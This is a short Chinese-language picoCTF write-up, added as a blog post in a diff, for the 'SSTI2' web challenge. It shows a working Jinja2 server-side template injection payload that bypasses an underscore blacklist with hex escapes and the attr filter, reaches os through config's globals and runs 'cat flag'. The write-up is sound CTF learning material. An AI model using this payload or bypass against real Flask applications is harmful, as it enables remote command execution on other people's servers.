@@ -1,0 +1,41 @@
+---
+title: 'SSTI2'
+description: ''
+pubDate: '2026-04-03'
+tags: ['picoCTF', 'Web']
+category: 'WriteUp'
+---
+
+分類：Web  
+難度：Medium
+
+### 工具
+
+1. AI 生 Payload
+
+### 過程
+
+1. 一題很明顯叫你要瘋狂亂試 Payload 的題目，也告訴我們有黑名單
+2. 先嘗試 `{{ 7*'7' }}` 發現回傳 7777777 確定是 Jinja2
+3. 接著就交給 AI 產生 Payload
+4. 多次嘗試 `__os__` 等，發現會擋 `__`
+5. 若是 Flask 可以嘗試 config 獲取對象
+6. 再看看 config 這個 class `{{ config | attr('\x5f\x5fclass\x5f\x5f') }}`
+7. 接著就是把 Python 的特性獲取 globals 再獲取 os
+
+```
+{{
+    config
+    | attr('\x5f\x5fclass\x5f\x5f')
+    | attr('\x5f\x5finit\x5f\x5f')
+    | attr('\x5f\x5fglobals\x5f\x5f')
+    | attr('\x5f\x5fgetitem\x5f\x5f')('os')
+    | attr('popen')('cat flag')
+    | attr('read')()
+}}
+```
+
+### Tips
+
+- Jinja2 支援 16 進位，所以可嘗試將 `_` 轉成 16 進位 `\x5f`
+- 使用 `|` 搭配 `attr` 可代替 `.` 存取屬性
